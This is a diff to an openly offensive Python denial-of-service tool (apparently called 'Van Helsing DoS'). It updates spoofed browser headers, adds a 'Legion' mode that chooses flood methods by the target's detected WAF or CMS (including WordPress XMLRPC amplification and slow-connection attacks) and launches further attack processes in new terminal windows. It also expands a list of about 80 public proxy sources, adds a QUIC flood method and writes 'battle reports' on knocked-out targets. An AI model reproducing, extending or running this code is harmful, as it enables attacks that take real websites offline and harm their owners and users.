+            "User-Agent": "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36",
+            "Sec-Ch-Ua": '"Chromium";v="136", "Google Chrome";v="136", "Not?A_Brand";v="99"',
             "Sec-Ch-Ua-Mobile": "?1", "Sec-Ch-Ua-Platform": '"Android"',
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
             "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate, br",
@@ -4821,7 +5072,7 @@ class HttpFlood(Thread):
                 try:
                     url = f"{self._target.scheme}://{self._target.authority}{probe_path}"
                     req = urllib.request.Request(url, headers={
-                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130.0.0.0 Safari/537.36'
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36'
                     })
                     with urllib.request.urlopen(req, timeout=5) as resp:
                         headers = str(resp.headers).lower()
@@ -5210,7 +5461,7 @@ class HttpFlood(Thread):
                 for i in range(burst_size):
                     try:
                         req = urllib.request.Request(target_url, headers={
-                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130.0.0.0 Safari/537.36'
+                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36'
                         })
                         with urllib.request.urlopen(req, timeout=4) as resp:
                             if resp.status in (403, 429):
@@ -5651,7 +5902,7 @@ class HttpFlood(Thread):
             target_url = f"{self._target.scheme}://{self._target.authority}/"
             t_start = time()
             req = urllib.request.Request(target_url, headers={
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130.0.0.0 Safari/537.36'
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36'
             })
             with urllib.request.urlopen(req, timeout=8) as resp:
                 latency = int((time() - t_start) * 1000)
@@ -5751,7 +6002,7 @@ class HttpFlood(Thread):
             import urllib.request
             t_start = time()
             req = urllib.request.Request(target_url, headers={
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130.0.0.0 Safari/537.36',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36',
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                 'Accept-Language': 'en-US,en;q=0.9',
                 'Accept-Encoding': 'gzip, deflate',
@@ -5858,7 +6109,7 @@ class HttpFlood(Thread):
             try:
                 probe_url = f"{self._target.scheme}://{self._target.authority}{probe_path}"
                 req2 = urllib.request.Request(probe_url, headers={
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130.0.0.0 Safari/537.36'
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/136.0.0.0 Safari/537.36'
                 })
                 with urllib.request.urlopen(req2, timeout=4) as resp2:
                     if resp2.status < 404:
@@ -6689,6 +6940,73 @@ class HttpFlood(Thread):
         if intel["total_executions"] % 50 == 0:
             self._chaos_multi_path_targeting()
             
+        # Phase 1.9.5: CHAOS LEGION MODE - AUTO SPAWN EXTERNAL CMD TERMINALS
+        # Runs once after deep recon (exec 35) to physically open new terminal windows for orthogonal attacks
+        if intel["total_executions"] == 35 and not intel.get("legion_mode_activated"):
+            intel["legion_mode_activated"] = True
+            try:
+                import sys, os
+                from urllib.parse import urlparse
+                # Only run if we are the main Chaos instance, not a spawned child
+                if "legion_slave_ignore" not in sys.argv:
+                    print(f"\n{bcolors.OKGREEN}[CHAOS LEGION] Deep Recon Complete. Establishing Multi-Terminal Assault...{bcolors.RESET}")
+                    
+                    target_url = f"{self._target.scheme}://{self._target.authority}"
+                    
+                    # Analyze gathered intel to select the most devastating orthogonal methods
+                    legion_methods = []
+                    
+                    waf = intel.get("waf_type", "")
+                    cms = intel.get("cms_type", "")
+                    
+                    if waf in ("cloudflare", "fastly", "ddos-guard", "akamai"):
+                        legion_methods = ["STEALTH_JA3", "SLOW_V2", "PPS"]
+                    elif cms == "wordpress":
+                        legion_methods = ["XMLRPC_AMP", "WP_SEARCH", "POST_DYN", "SLOW_V2"]
+                    elif cms in ("laravel", "codeigniter", "livewire") or "ci_session" in str(intel.get("infra_map")):
+                        legion_methods = ["POST_DYN", "STRESS", "SLOW_V2", "PPS"]
+                    elif intel.get("infra_map", {}).get("vercel") or intel.get("infra_map", {}).get("nuxt"):
+                        legion_methods = ["STEALTH_JA3", "SLOW_V2", "POST_DYN"]
+                    elif intel.get("server_type") == "litespeed":
+                        legion_methods = ["STRESS", "SLOW_V2", "POST_DYN"]
+                    else:
+                        legion_methods = ["POST_DYN", "SLOW_V2", "STRESS"]
+                        
+                    # Limit to 3 extra windows to prevent system crash
+                    legion_methods = legion_methods[:3]
+                    
+                    # [V36] Proxy Partitioner - Prevent Socket Exhaustion by splitting pool
+                    proxy_files = []
+                    if len(PROXY_LIST) > 100:
+                        chunk_size = len(PROXY_LIST) // (len(legion_methods) + 1)
+                        for i, m in enumerate(legion_methods):
+                            p_file = f"proxy_legion_{i+1}.txt"
+                            start_idx = (i + 1) * chunk_size
+                            end_idx = start_idx + chunk_size
+                            partition = PROXY_LIST[start_idx:end_idx]
+                            
+                            with open(p_file, "w") as f:
+                                for p in partition:
+                                    f.write(f"{p.ip}:{p.port}\n")
+                            proxy_files.append(p_file)
+                    else:
+                        proxy_files = ["proxy.txt"] * len(legion_methods)
+                    
+                    import threading
+                    def spawn_legion():
+                        for idx, m in enumerate(legion_methods):
+                            title = f"Van Helsing DoS Legion Slave - {m}"
+                            p_file = proxy_files[idx]
+                            # Pass 'legion_slave_ignore' to prevent infinite recursive terminal popping
+                            cmd = f'start "{title}" cmd /k "{sys.executable} start.py {m} {target_url} 5 100 {p_file} 5 800 legion_slave_ignore"'
+                            print(f"{bcolors.OKCYAN} -> Launching Legion Battalion: {m} (Proxy Part: {p_file}){bcolors.RESET}")
+                            os.system(cmd)
+                            time.sleep(1)
+                            
+                    threading.Thread(target=spawn_legion, daemon=True).start()
+            except Exception as e:
+                pass
+            
         # Apply timing jitter (human-like random delay)
         jitter = intel.get("jitter_ms", 0)
         if jitter > 0:
@@ -7518,7 +7836,7 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
                 f"{bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING} Proxies are getting checked, this may take awhile{bcolors.RESET}!"
             )
             Proxies = ProxyChecker.checkAll(
-                Proxies, timeout=5, threads=threads,
+                Proxies, timeout=5, threads=min(1000, len(Proxies)),
                 url=url.human_repr() if url else "http://httpbin.org/get",
             )
 
@@ -7561,26 +7879,98 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
         logger.warning(f"{bcolors.FAIL}Primary Proxy File Failed or Empty! Activating Scavenger Mode...{bcolors.RESET}")
         logger.info(f"{bcolors.WARNING}Downloading Fresh Proxies from Public Sources...{bcolors.RESET}")
         
-        # Fresh Sources (ULTIMATE COLLECTION - 16 SOURCES)
+        # Fresh Sources (SYNCED WITH MENU.PY HARVESTER v4 — 80+ VERIFIED)
         sources = [
-            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
-            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
-            "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
-            "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks5.txt",
-            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/socks5.txt",
-            "https://raw.githubusercontent.com/Zloi-User/hideip.me/main/socks5.txt",
-            "https://raw.githubusercontent.com/ManuGM/proxy-365/main/SOCKS5.txt",
-            "https://raw.githubusercontent.com/tuanminpay/live-proxy-list/master/socks5.txt",
+            # ===== TIER 1: MEGA SOURCES (10K+ each) =====
+            "https://raw.githubusercontent.com/mishakorzik/Free-Proxy/main/proxy.txt",
+            "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt",
+            "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks4.txt",
+            "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5.txt",
+            "https://raw.githubusercontent.com/casals-ar/proxy-list/main/http",
+            "https://raw.githubusercontent.com/casals-ar/proxy-list/main/socks4",
             "https://raw.githubusercontent.com/casals-ar/proxy-list/main/socks5",
-            "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks5.txt",
-            "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/socks5/global/socks5_checked.txt",
-            "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt",
-            "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks5/socks5.txt",
-            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
-            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
+            "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt",
+            "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/https.txt",
+            "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks4.txt",
+            "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks5.txt",
+            "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
+            "https://raw.githubusercontent.com/SoliSpirit/proxy-list/main/http.txt",
+            "https://raw.githubusercontent.com/SoliSpirit/proxy-list/main/socks4.txt",
+            "https://raw.githubusercontent.com/SoliSpirit/proxy-list/main/socks5.txt",
+            # ===== TIER 2: HIGH-VOLUME (1K-10K each) =====
+            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
+            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",
+            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
+            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
+            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
+            "https://raw.githubusercontent.com/tuanminpay/live-proxy/master/http.txt",
+            "https://raw.githubusercontent.com/tuanminpay/live-proxy/master/socks4.txt",
+            "https://raw.githubusercontent.com/tuanminpay/live-proxy/master/socks5.txt",
+            "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt",
+            "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/socks4.txt",
+            "https://raw.githubusercontent.com/zevtyardt/proxy-list/main/socks5.txt",
+            "https://openproxylist.xyz/http.txt",
+            "https://openproxylist.xyz/socks4.txt",
+            "https://openproxylist.xyz/socks5.txt",
+            "https://raw.githubusercontent.com/r00tee/Proxy-List/main/Https.txt",
+            "https://raw.githubusercontent.com/r00tee/Proxy-List/main/Socks4.txt",
+            "https://raw.githubusercontent.com/r00tee/Proxy-List/main/Socks5.txt",
+            "https://proxyspace.pro/http.txt",
+            "https://proxyspace.pro/socks5.txt",
+            "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
+            "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
             "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
-            "https://raw.githubusercontent.com/Jakee8718/Free-Proxies/main/socks5/socks5.txt",
-            "https://raw.githubusercontent.com/UrielChaves/File-Proxy/master/Socks5.txt"
+            "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/http.txt",
+            "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/socks4.txt",
+            "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/socks5.txt",
+            "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt",
+            "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/socks4_proxies.txt",
+            "https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/socks5_proxies.txt",
+            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
+            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
+            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
+            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
+            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks4/data.txt",
+            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/socks5/data.txt",
+            # ===== TIER 3: MEDIUM (100-1K each) =====
+            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
+            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
+            "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
+            "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt",
+            "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt",
+            "https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt",
+            "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks4.txt",
+            "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks5.txt",
+            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
+            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
+            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
+            "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/http.txt",
+            "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks4.txt",
+            "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks5.txt",
+            "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt",
+            "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks4.txt",
+            "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks5.txt",
+            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
+            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
+            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
+            "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
+            "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/socks5/global/socks5_checked.txt",
+            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt",
+            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
+            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
+            "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt",
+            "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/socks4.txt",
+            "https://raw.githubusercontent.com/saisuiu/Lionkings-Http-Proxys-Proxies/main/free.txt",
+            "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/generated/socks4_proxies.txt",
+            "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/generated/socks5_proxies.txt",
+            # ===== TIER 4: API ENDPOINTS =====
+            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
+            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all",
+            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all",
+            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout=10000&country=all&ssl=all&anonymity=all",
+            # ===== TIER 5: CDN MIRRORS (proxifly via jsDelivr) =====
+            "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/all/data.txt",
         ]
         
         scavenged_proxies = []
@@ -7741,6 +8131,11 @@ async def main_async():
                         flood = AsyncHttpFlood(thread_id, url, host, rpc, event, uagents, referers, proxies, discovered_paths, method)
                         flood.host_array = host_array
                         tasks.append(asyncio.create_task(flood._run_async()))
+                elif method == "H3_QUIC":
+                    for thread_id in range(threads):
+                        flood = AsyncQuicFlood(thread_id, url, host, rpc, event, uagents, referers, proxies, discovered_paths, method)
+                        flood.host_array = host_array
+                        tasks.append(asyncio.create_task(flood._flood_quic()))
                 else:
                     # [FIX] Thread-based methods need run_in_executor to avoid blocking event loop
                     loop = asyncio.get_event_loop()
@@ -7765,8 +8160,17 @@ async def main_async():
                          last_bytes = current_bytes
                          await asyncio.sleep(1)
                     print()
+                    # [V36] Battle Report Generation
+                    try:
+                        target_str = target or url.host
+                        safe_target = target_str.replace("https://", "").replace("http://", "").replace("/", "")[:15]
+                        report_file = f"battle_report_{safe_target}.txt"
+                        report_content = f"=== CHAOS BATTLE REPORT ===\nTarget: {target_str}\nTarget Status: Assumed Offline/Stressed\nDuration: {timer} seconds\nTotal Sent: {int(REQUESTS_SENT):,} requests\nData Egress: {Tools.human_format(int(BYTES_SEND), 'B')}\n===========================\n"
+                        with open(report_file, "a", encoding="utf-8") as rf:
+                            rf.write(report_content + "\n")
+                        print(f"{bcolors.OKGREEN}[+] Battle Report saved -> {report_file}{bcolors.RESET}")
+                    except: pass
                     import os; os._exit(0)
-
                 tasks.append(asyncio.create_task(display_status()))
                 await asyncio.gather(*tasks)
 
